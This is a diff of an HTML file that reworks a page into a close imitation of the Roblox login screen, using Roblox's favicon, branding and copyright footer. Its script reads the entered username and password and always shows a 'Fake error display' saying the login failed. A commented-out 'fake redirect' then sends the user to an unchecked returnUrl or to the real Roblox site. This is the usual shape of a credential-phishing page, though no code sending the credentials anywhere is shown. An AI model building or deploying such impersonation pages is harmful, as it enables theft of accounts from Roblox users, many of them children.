@@ -2,212 +2,166 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Roblox</title>
-  <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
+  <title>Log In to Roblox</title>
+  <link rel="icon" href="https://images.rbxcdn.com/8370dfb9fd31466b6092a5f4960340a9.ico" type="image/x-icon">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
+    :root {
+      --roblox-blue: #1a70f0;
+      --roblox-dark: #111827;
+      --roblox-gray: #f9f9f9;
+    }
+
     body {
       margin: 0;
+      padding: 0;
+      background-color: var(--roblox-gray);
       font-family: 'Source Sans Pro', sans-serif;
-      background-color: #e0e0e0;
+    }
+
+    .wrapper {
+      max-width: 420px;
+      background: white;
+      margin: 60px auto;
+      padding: 48px 36px;
+      border-radius: 8px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.15);
+    }
+
+    .logo-container {
       display: flex;
       justify-content: center;
+      margin-bottom: 24px;
+    }
+
+    .logo-icon {
+      width: 64px;
+      height: 64px;
+      background-color: var(--roblox-blue);
+      border-radius: 14px;
+      display: flex;
       align-items: center;
-      height: 100vh;
+      justify-content: center;
     }
 
-    .container {
-      background-color: #ffffff;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      width: 400px;
-      padding: 30px;
+    .logo-icon div {
+      width: 28px;
+      height: 28px;
+      background-color: white;
+      transform: rotate(45deg);
     }
 
-    h2 {
-      font-size: 20px;
+    h1 {
+      font-size: 22px;
       font-weight: 700;
-      margin-bottom: 20px;
       text-align: center;
+      margin-bottom: 30px;
+      color: var(--roblox-dark);
     }
 
-    input, select {
+    input[type="text"], input[type="password"] {
       width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      font-size: 14px;
+      padding: 12px 14px;
+      font-size: 15px;
       border: 1px solid #ccc;
       border-radius: 6px;
+      margin-bottom: 16px;
+      box-sizing: border-box;
     }
 
     button {
+      background-color: var(--roblox-blue);
+      color: white;
+      font-weight: bold;
+      font-size: 15px;
       width: 100%;
       padding: 12px;
-      font-size: 15px;
-      font-weight: bold;
       border: none;
       border-radius: 6px;
-      background-color: #393b3d;
-      color: white;
       cursor: pointer;
+      margin-top: 4px;
     }
 
     button:hover {
-      background-color: #2f3133;
+      background-color: #115cdf;
     }
 
-    .link {
-      margin-top: 15px;
-      display: block;
+    .link-line {
       text-align: center;
+      margin-top: 18px;
       font-size: 13px;
-      color: #0074bd;
+    }
+
+    .link-line a {
+      color: var(--roblox-blue);
       text-decoration: none;
     }
 
-    .link:hover {
+    .link-line a:hover {
       text-decoration: underline;
     }
 
-    .alt-btn {
-      width: 100%;
-      margin-top: 12px;
-      padding: 10px;
-      background-color: #dcdcdc;
-      border: none;
-      border-radius: 6px;
-      font-weight: bold;
-      color: #333;
-      cursor: pointer;
-    }
-
-    .alt-btn:hover {
-      background-color: #c9c9c9;
-    }
-
-    .gender-buttons {
-      display: flex;
-      gap: 10px;
-      margin-top: 10px;
-    }
-
-    .gender-buttons button {
-      flex: 1;
-      padding: 12px;
-      background-color: #eee;
-      color: #333;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-weight: bold;
-    }
-
-    .gender-buttons button:hover {
-      background-color: #ddd;
-    }
-
-    .small-text {
-      font-size: 11px;
-      color: #444;
-      margin-top: 14px;
-      text-align: center;
-    }
-
-    .small-text a {
-      color: #0074bd;
-      text-decoration: none;
-    }
-
-    .small-text a:hover {
-      text-decoration: underline;
-    }
-
-    .hidden {
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: 8px;
       display: none;
     }
 
+    .footer {
+      margin-top: 60px;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+    }
   </style>
 </head>
 <body>
 
-  <div class="container" id="loginPage">
-    <h2>Add Account</h2>
-    <input type="text" placeholder="Username / Email / Phone">
-    <input type="password" placeholder="Password">
-    <button>Log In</button>
-    <a href="#" class="link">Forgot Password or Username?</a>
-    <hr style="margin: 20px 0; border-color: #ccc;">
-    <button class="alt-btn">Email Me a One-Time Code</button>
-    <button class="alt-btn">Use Another Device</button>
-    <a href="#" class="link" onclick="showSignup()">Create A New Account</a>
+  <div class="wrapper">
+    <div class="logo-container">
+      <div class="logo-icon"><div></div></div>
+    </div>
+    <h1>Log In to Roblox</h1>
+    <input type="text" id="username" placeholder="Username / Email / Phone">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="handleLogin()">Log In</button>
+    <div class="error" id="errorBox">Incorrect username or password.</div>
+    <div class="link-line"><a href="#">Forgot Password or Username?</a></div>
+    <div class="link-line" style="margin-top: 10px;"><a href="#">Sign Up</a></div>
   </div>
 
-  <div class="container hidden" id="signupPage">
-    <h2>Create a New Account</h2>
-
-    <label>Birthday</label>
-    <div style="display: flex; gap: 8px;">
-      <select>
-        <option>January</option>
-        <option>February</option>
-        <option>March</option>
-        <option>April</option>
-        <option>May</option>
-        <option>June</option>
-        <option>July</option>
-        <option>August</option>
-        <option>September</option>
-        <option>October</option>
-        <option>November</option>
-        <option>December</option>
-      </select>
-      <select>
-        <option>1</option><option>2</option><option>3</option><option>4</option>
-        <option>5</option><option>6</option><option>7</option><option>8</option>
-        <option>9</option><option>10</option><option>11</option><option>12</option>
-        <option>13</option><option>14</option><option>15</option><option>16</option>
-        <option>17</option><option>18</option><option>19</option><option>20</option>
-        <option>21</option><option>22</option><option>23</option><option>24</option>
-        <option>25</option><option>26</option><option>27</option><option>28</option>
-        <option>29</option><option>30</option><option>31</option>
-      </select>
-      <select>
-        <option>2000</option><option>2001</option><option>2002</option><option>2003</option>
-        <option>2004</option><option>2005</option><option>2006</option><option>2007</option>
-        <option>2008</option><option>2009</option><option>2010</option><option>2011</option>
-        <option>2012</option><option>2013</option><option>2014</option><option>2015</option>
-        <option>2016</option><option>2017</option><option>2018</option><option>2019</option>
-      </select>
-    </div>
-
-    <input type="text" placeholder="Don't use your real name">
-    <input type="password" placeholder="At least 8 characters">
-
-    <label style="margin-top: 10px;">Gender (optional)</label>
-    <div class="gender-buttons">
-      <button title="Male">♂️</button>
-      <button title="Female">♀️</button>
-    </div>
-
-    <div class="small-text">
-      By clicking Sign Up, you agree to the <a href="#">Terms of Use</a>  
-      and <a href="#">Privacy Policy</a>.
-    </div>
-
-    <button style="margin-top: 20px;">Sign Up</button>
-    <a href="#" class="link" onclick="showLogin()">Back to Login</a>
+  <div class="footer">
+    &copy; 2025 Roblox Corporation. All rights reserved.
   </div>
 
   <script>
-    function showSignup() {
-      document.getElementById('loginPage').classList.add('hidden');
-      document.getElementById('signupPage').classList.remove('hidden');
-    }
+    const returnUrl = decodeURIComponent(new URLSearchParams(window.location.search).get("returnUrl") || "");
 
-    function showLogin() {
-      document.getElementById('signupPage').classList.add('hidden');
-      document.getElementById('loginPage').classList.remove('hidden');
+    function handleLogin() {
+      const user = document.getElementById('username').value.trim();
+      const pass = document.getElementById('password').value;
+      const errorBox = document.getElementById('errorBox');
+
+      if (!user || !pass) {
+        errorBox.textContent = "All fields are required.";
+        errorBox.style.display = 'block';
+        return;
+      }
+
+      // Fake error display
+      errorBox.textContent = "Incorrect username or password.";
+      errorBox.style.display = 'block';
+
+      // Optional fake redirect after short delay
+      // setTimeout(() => {
+      //   if (returnUrl) {
+      //     window.location.href = returnUrl;
+      //   } else {
+      //     window.location.href = "https://www.roblox.com/home";
+      //   }
+      // }, 1500);
     }
   </script>
 
